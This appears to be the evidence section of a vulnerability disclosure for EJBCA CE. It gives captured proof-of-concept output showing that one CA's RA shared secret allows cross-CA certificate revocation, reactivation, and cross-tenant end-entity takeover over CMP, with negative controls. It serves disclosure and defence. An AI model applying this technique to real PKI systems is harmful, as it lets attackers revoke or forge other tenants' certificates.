# Evidence — captured lab transcripts

Verified end-to-end against `keyfactor/ejbca-ce:latest` (EJBCA CE app 9.3.7) using the scripts in this
repo (`lab/setup.sh` + `pocs/*.sh`). The ManagementCA recipient DN is derived at runtime; in this run it
resolved to `/UID=c-06h94rzaxdhz4pcio/CN=ManagementCA/O=EJBCA Container Quickstart` (instance-specific UID).

## E-01 — cross-CA revocation (`pocs/e01_cross_ca_revoke.sh`)
```
### issue a fresh CA-B (Tenant B) certificate: victimB3 ###
  User 'victimB3' has been added.
  victimB3 issuer: CN=CA-B, O=Tenant B
  [0] OCSP before:              victimB3.pem: good
### NEGATIVE CONTROL: recipient=ManagementCA + WRONG secret -> auth must FAIL (no revoke) ###
  [1] OCSP after wrong-secret:  victimB3.pem: good   (must still be good)
### ATTACK: recipient=ManagementCA + secretA (CA-A's RA secret) targeting a CA-B cert ###
  [2] OCSP after attack:        victimB3.pem: revoked   (REVOKED => cross-CA revocation confirmed)
```
The attacker authenticated with `secretA` (ManagementCA's per-CA secret) and revoked a **CA-B** certificate.
The wrong-secret control leaves it `good`, proving authentication is enforced.

## E-01 — cross-CA reactivation (`pocs/e01_cross_ca_reactivate.sh`)
```
  [0] before:                 victimB4.pem: good
### cross-CA HOLD (reason 6 = certificateHold) with secretA ###
  [1] after hold:             victimB4.pem: revoked
### cross-CA REACTIVATE (reason 8 = removeFromCRL) with secretA ###
  [2] after removeFromCRL:    victimB4.pem: good   (good => a tenant un-revoked another CA's cert)
```

## E-02 — cross-tenant end-entity takeover (`pocs/e02_cross_tenant_takeover.sh`)
```
Fresh victim username: tbUser1786780129   (created ONLY under CA-B / Tenant B)
  BASELINE cert issuer = CN=CA-B, O=Tenant B     <-- Tenant-B ownership established
  neg-control cert issued? NO-good               <-- wrong secret issues nothing
  ATTACK cert issuer = CN=ManagementCA, ...      <-- minted with only secretA
### PROOF: certs from BOTH CAs ###
      1 Issuer: CN=CA-B,O=Tenant B
      1 Issuer: CN=ManagementCA, ...
```
A holder of **only** ManagementCA's RA secret overwrote a CA-B end entity and minted a ManagementCA
certificate for that identity; the CA-B baseline cert (positive control) proves the record pre-existed
under Tenant B.

## Notes / gotchas for reviewers
- `ra findendentity` does not print the owning CA, so the CA is read from the **issued certificate's issuer**.
- `ra delendentity` will not remove a cert-bearing entity; the E-02 PoC uses a fresh timestamped username each run.
- CRLs can be stale; E-01 uses **OCSP** (real-time) as the oracle. Reactivation only applies to certificates currently on `certificateHold`.
- `openssl cmp -cmd ir` needs the CA cert as a trust anchor (`-trusted mca.pem`) to validate the signed response; the request is processed server-side regardless.
